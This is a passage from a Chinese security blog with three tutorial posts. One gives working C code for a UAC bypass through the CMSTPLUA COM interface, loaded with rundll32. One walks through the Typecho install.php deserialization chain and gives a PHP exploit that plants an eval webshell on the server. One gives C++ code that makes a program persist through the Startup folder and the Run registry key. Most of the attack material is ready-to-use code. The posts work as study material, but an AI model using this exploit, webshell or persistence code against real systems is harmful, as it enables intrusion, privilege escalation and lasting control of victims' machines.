class="function"></span>&#123;</span><br><span class="line">    HRESULT hr = <span class="number">0</span>;</span><br><span class="line">    CLSID clsidICMLuaUtil = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    IID iidICMLuaUtil = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    ICMLuaUtil* CMLuaUtil = <span class="literal">NULL</span>;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        ::CLSIDFromString(CLSID_CMSTPLUA, &amp;clsidICMLuaUtil);</span><br><span class="line">        ::IIDFromString(IID_ICMLuaUtil, &amp;iidICMLuaUtil);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 提权</span></span><br><span class="line">        hr = CoCreateInstanceAsAdmin(<span class="literal">NULL</span>, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&amp;CMLuaUtil));</span><br><span class="line">        <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 启动程序</span></span><br><span class="line">        hr = CMLuaUtil-&gt;lpVtbl-&gt;ShellExec(CMLuaUtil, lpwszExecutable, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, SW_SHOW);</span><br><span class="line">        <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bRet = TRUE;</span><br><span class="line">    &#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放</span></span><br><span class="line">    <span class="keyword">if</span> (CMLuaUtil)</span><br><span class="line">    &#123;</span><br><span class="line">        CMLuaUtil-&gt;lpVtbl-&gt;Release(CMLuaUtil);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//导出函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> CALLBACK <span class="title">BypassUAC</span><span class="params">(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, <span class="keyword">int</span> iCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CMLuaUtilBypassUAC((LPWSTR)<span class="string">L&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>用lordpe查看生成dll的导出表，发现存在导出函数</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6ZYnVH"><img src="https://s3.ax1x.com/2021/03/04/6ZYnVH.png" alt="6ZYnVH.png"></a></p>
<p>用rundll32.exe调用导出函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 ComBypassUACdll.dll,BypassUAC</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6ZYeqe"><img src="https://s3.ax1x.com/2021/03/04/6ZYeqe.png" alt="6ZYeqe.png"></a></p>
<p>BypassUAC成功</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6ZYuad"><img src="https://s3.ax1x.com/2021/03/04/6ZYuad.png" alt="6ZYuad.png"></a></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《Windows黑客编程技术详解》</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-03-03T07:32:56.000Z" title="2021-03-03T07:32:56.000Z">2021-03-03</time>发表</span><span class="level-item"><time dateTime="2021-03-03T07:33:31.397Z" title="2021-03-03T07:33:31.397Z">2021-03-03</time>更新</span><span class="level-item">5 分钟读完 (大约812个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/03/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/">typecho反序列化分析</a></h1><div class="content"><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>1.install.php</p>
<p>install.php中存在unserialize函数，__typecho_config可控。值被作为参数传入类Typecho_Db</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603f366b28110700016f75f6"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/8d5d50a3-2fe6-4c8c-baaf-fabd0b3a1869.png" alt="imgbed.cn图床"></a></p>
<p>2./var/Typecho/Cookie.php</p>
<p>Typecho_Cookie::get方法从Cookie或者是POST数组中获取数据</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603f36733cfcc50001576f61"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/e5924563-8b86-4d61-8ddc-bb46aaeea102.png" alt="imgbed.cn图床"></a></p>
<p>3./var/Typecho/Db.php</p>
<p>跟进类Typecho_Db,传入的参数被作为字符串拼接，触发__toString()，全局搜索toString</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603f394ae9788300015e11ee"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/5eed6331-803d-4ef0-a608-5c6e74f41a63.png" alt="imgbed.cn图床"></a></p>
<p>4./var/Typecho/Feed.php中存在可利用toString方法</p>
<p>满足条件self::RSS2 == $this-&gt;_type执行下面的语句，如果$item[‘author’]是一个类，就会触发__get()方法，开始全局搜索get方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> .= <span class="string">&#x27;&lt;dc:creator&gt;&#x27;</span> . htmlspecialchars(<span class="variable">$item</span>[<span class="string">&#x27;author&#x27;</span>]-&gt;screenName) . <span class="string">&#x27;&lt;/dc:creator&gt;&#x27;</span> . <span class="built_in">self</span>::EOL;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603f36877c46e800014fad42"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/02dedb11-1de4-4f60-9e43-b412f42870e7.png" alt="imgbed.cn图床"></a></p>
<p>5./var/Typecho/request.php</p>
<p>request.php中Typecho_Request类存在__get()方法，<code>__get</code>()含有一个参数，即要获取的成员属性的名称，$key=’screenName’</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603f369b2ff44a0001828d25"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/03339ab0-a0e5-4f54-83b5-f3dde2d3489b.png" alt="imgbed.cn图床"></a></p>
<p>6.跟进get方法</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603f36ae91df94000121437f"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/abc5d750-4cf6-444c-a8d2-64f33fd5f834.png" alt="imgbed.cn图床"></a></p>
<p>6.跟进<code>_applyFilter</code>方法，发现call_user_func函数，到达终点。filter属性为要执行的函数，$value来源为传入参数，在get函数中被<code>$value = $this-&gt;_params[$key]</code>赋值，来源于属性_params。<code>$this-&gt;_params[$key]</code>等于<code>$this-&gt;_params[&#39;screenName&#39;]</code></p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603f36ba6df2d3000109c02c"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/4f2c37c1-923d-4950-83c4-b4592fd71c4a.png" alt="imgbed.cn图床"></a></p>
<h2 id="构造利用链"><a href="#构造利用链" class="headerlink" title="构造利用链"></a>构造利用链</h2><p>令Typecho_Db类中的$adapterName=$config[‘adapter’]等于Feed.php中的Typecho_Feed类，创建一个数组$a=array(‘adapter’ =&gt;new Typecho_Feed(),’prefix’ =&gt; ‘typecho_’)</p>
<p>令Typecho_Feed类中的$item[‘author’]等于Typecho_Request类</p>
<p>令Typecho_Request类中的属性<code>_params=array(&#39;screenName&#39;=&gt;&#39;file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\$_POST[\&#39;a\&#39;]); ?&gt;&quot;)&#39;)</code></p>
<p>令Typecho_Request类中的属性_filter=array(‘assert’)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = <span class="string">&#x27;file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\$_POST[\&#x27;a\&#x27;]); ?&gt;&quot;)&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> RSS2 = <span class="string">&#x27;RSS 2.0&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_type</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_items</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type=<span class="built_in">self</span>::RSS2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>]=<span class="keyword">array</span>(<span class="string">&#x27;author&#x27;</span>=&gt;<span class="keyword">new</span> Typecho_Request());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&#x27;adapter&#x27;</span> =&gt;<span class="keyword">new</span> Typecho_Feed(),<span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;typecho_&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>



<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>install.php中要求触发反序列化需要满足两个条件</p>
<p>必须有GET参数finish</p>
<p>Refer必须为本站链接，如<a target="_blank" rel="noopener" href="http://127.0.0.1/typecho">http://127.0.0.1/typecho</a></p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603f36c61b484900018f385a"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/736ce55e-b9e8-4ac4-81ad-822f44a1be51.png" alt="imgbed.cn图床"></a></p>
<h2 id="利用结果"><a href="#利用结果" class="headerlink" title="利用结果"></a>利用结果</h2><p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603f36cf91df9400012143b4"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/4870195c-db40-4b0c-b73b-2511d30812bf.png" alt="imgbed.cn图床"></a></p>
<p>写入成功</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603f36ddb3108e0001913085"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/8acf0548-facf-40cd-ae80-c616e44c718c.png" alt="imgbed.cn图床"></a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-03-01T13:10:37.000Z" title="2021-03-01T13:10:37.000Z">2021-03-01</time>发表</span><span class="level-item"><time dateTime="2021-03-01T13:11:27.253Z" title="2021-03-01T13:11:27.253Z">2021-03-01</time>更新</span><span class="level-item">5 分钟读完 (大约810个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/01/%E9%80%9A%E8%BF%87%E6%B7%BB%E5%8A%A0%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95%E5%92%8C%E5%92%8C%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">通过添加启动目录和和修改注册表进行权限维持</a></h1><div class="content"><h1 id="添加启动目录"><a href="#添加启动目录" class="headerlink" title="添加启动目录"></a>添加启动目录</h1><p>由于启动目录不固定，需要先通过SHGetSpecialFolderPath获取启动路径，再CopyFile把要自启动的程序复制过去</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;shlobj_core.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">wchar_t</span> StartupFolder[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">wchar_t</span> Path[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	BOOL bRet= SHGetSpecialFolderPath(<span class="literal">NULL</span>, StartupFolder, CSIDL_STARTUP, FALSE);</span><br><span class="line">	<span class="keyword">if</span> (!bRet) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	GetModuleFileName(<span class="literal">NULL</span>, (LPWSTR)&amp;Path, MAX_PATH);</span><br><span class="line">	wcscat_s(StartupFolder, <span class="string">L&quot;\\Persistance.exe&quot;</span>);</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>, StartupFolder, <span class="string">L&quot;StartupFolder&quot;</span>, MB_OK);</span><br><span class="line">	<span class="keyword">if</span> (CopyFile(Path, StartupFolder, FALSE)) &#123;</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;succeed&quot;</span>, <span class="string">L&quot;succeed&quot;</span>, MB_OK);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h1><p>无需管理员权限即可修改HKEY_CURRENT_USER</p>
<p>在HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run中写入程序路径即可实现开机自启动</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加自身到注册表启动项</span></span><br><span class="line"><span class="function">BOOL <span class="title">Regpersist</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HKEY hKey;</span><br><span class="line">	LPCTSTR szRun = _T(<span class="string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (RegOpenKeyEx(HKEY_CURRENT_USER, szRun, <span class="number">0</span>, KEY_ALL_ACCESS, &amp;hKey)</span><br><span class="line">		== ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">			TCHAR szFileName[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">			DWORD dwRet = GetModuleFileName(<span class="literal">NULL</span>, szFileName, MAX_PATH);</span><br><span class="line">			AfxMessageBox(szFileName);</span><br><span class="line">			<span class="keyword">long</span> lRet = RegSetValueEx(hKey, _T(<span class="string">&quot;Login&quot;</span>), <span class="number">0</span>, REG_SZ, (BYTE*)szFileName, dwRet);</span><br><span class="line">			RegCloseKey(hKey);</span><br><span class="line">			<span class="keyword">if</span> (lRet != ERROR_SUCCESS)</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">		<span class="comment">//else	// 删除启动;</span></span><br><span class="line">		<span class="comment">//&#123;</span></span><br><span class="line">		<span class="comment">//	long lRet = RegDeleteValue(hKey, &quot;MFCLogin&quot;);</span></span><br><span class="line">		<span class="comment">//	RegCloseKey(hKey);</span></span><br><span class="line">		<span class="comment">//	if (lRet != ERROR_SUCCESS)</span></span><br><span class="line">		<span class="comment">//		return FALSE;</span></span><br><span class="line">		<span class="comment">//&#125;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(_T(<span class="string">&quot;打开注册表失败&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	MessageBox(_T(<span class="string">&quot;添加成功&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="相关API函数"><a href="#相关API函数" class="headerlink" title="相关API函数"></a>相关API函数</h1><h2 id="SHGetSpecialFolderPath"><a href="#SHGetSpecialFolderPath" class="headerlink" title="SHGetSpecialFolderPath"></a>SHGetSpecialFolderPath</h2><p>该api用来获取指定的系统路径 </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SHGetSpecialFolderPathA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HWND  hwnd,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSTR pszPath,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span>   csidl, <span class="comment">//CSIDL_STARTUP</span></span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL  fCreate</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="RegOpenKey"><a href="#RegOpenKey" class="headerlink" title="RegOpenKey"></a>RegOpenKey</h2><p>打开注册表，成功返回ERROR_SUCCESS</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegOpenKeyA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY   hKey,   <span class="comment">//指定一个父键句柄  HKEY_CURRENT_USER </span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR lpSubKey,<span class="comment">//指向一个字符串，表示要打开的子键名称,_T(&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;)</span></span></span></span><br><span class="line"><span class="function"><span class="params">  PHKEY  phkResult<span class="comment">//返回打开的子键句柄 &amp;hKey</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="RegCloseKey"><a href="#RegCloseKey" class="headerlink" title="RegCloseKey"></a>RegCloseKey</h2><p>关闭注册表，成功返回ERROR_SUCCESS</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegCloseKey</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY hKey<span class="comment">//打开的子键句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="RegQueryValueEx"><a href="#RegQueryValueEx" class="headerlink" title="RegQueryValueEx"></a>RegQueryValueEx</h2><p>注册表键值的查询</p>
<p>成功返回  ERROR_SUCCESS.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegQueryValueExA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY    hKey,<span class="comment">//指向一个已经被打开或创建的子键句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR  lpValueName,<span class="comment">//指定要被查询的键值的名称</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpReserved,<span class="comment">//保留，始终NULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpType,<span class="comment">//返回被查询的值的类型</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPBYTE  lpData,<span class="comment">//返回被查询数据的缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpcbData<span class="comment">//缓冲区长度</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="RegSetValueEx"><a href="#RegSetValueEx" class="headerlink" title="RegSetValueEx"></a>RegSetValueEx</h2><p>注册表键值的写入</p>
<p>成功返回  ERROR_SUCCESS.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegSetValueExA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY       hKey,<span class="comment">//指向一个已经被打开或创建的子键句柄 HKEY_LOCAL</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR     lpValueName,<span class="comment">//指定要被查询或写入的键值的名称 MFCLogin</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD      Reserved,<span class="comment">//保留，始终为0   0</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD      dwType,<span class="comment">//写入键值的类型   REG_SZ</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> BYTE *lpData,<span class="comment">//写入键值的缓冲区   路径</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD      cbData<span class="comment">//写入键值缓冲区的长度    sizeof</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="RegEnumValue"><a href="#RegEnumValue" class="headerlink" title="RegEnumValue"></a>RegEnumValue</h2><p>注册表键值的枚举</p>
<p>成功返回  ERROR_SUCCESS.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegEnumValueA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY    hKey,<span class="comment">//指向一个已经被打开或创建的子键句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   dwIndex,<span class="comment">//查询的索引值</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSTR   lpValueName,<span class="comment">//健名的缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpcchValueName,<span class="comment">//健名缓冲区的长度</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpReserved,<span class="comment">//保留，NULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpType,<span class="comment">//返回被查询的值的类型</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPBYTE  lpData,<span class="comment">//被查询键值的缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpcbData<span class="comment">//被查询键值的缓冲区的大小</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="RegDeleteValue"><a href="#RegDeleteValue" class="headerlink" title="RegDeleteValue"></a>RegDeleteValue</h2><p>注册表键值的删除</p>
<p>成功返回  ERROR_SUCCESS.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegDeleteValueA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY   hKey,<span class="comment">//指向一个已经被打开或创建的子键句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR lpValueName<span class="comment">//指向欲删除的键值项的名称</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<h2 id="GetModuleFileName"><a href="#GetModuleFileName" class="headerlink" title="GetModuleFileName"></a>GetModuleFileName</h2><p>在开发过程中经常需要获得程序当前的运行目录，这时就可以使用GetModuleFileName</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">GetModuleFileName</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HMODULE hModule,<span class="comment">//要获取文件名的模块名柄,null表示当前模块</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPTSTR lpFileName,<span class="comment">//输出参数，存放取得的文件名 TCHAR lpfilename</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nSize<span class="comment">//参数的长度     MAX_PATH</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



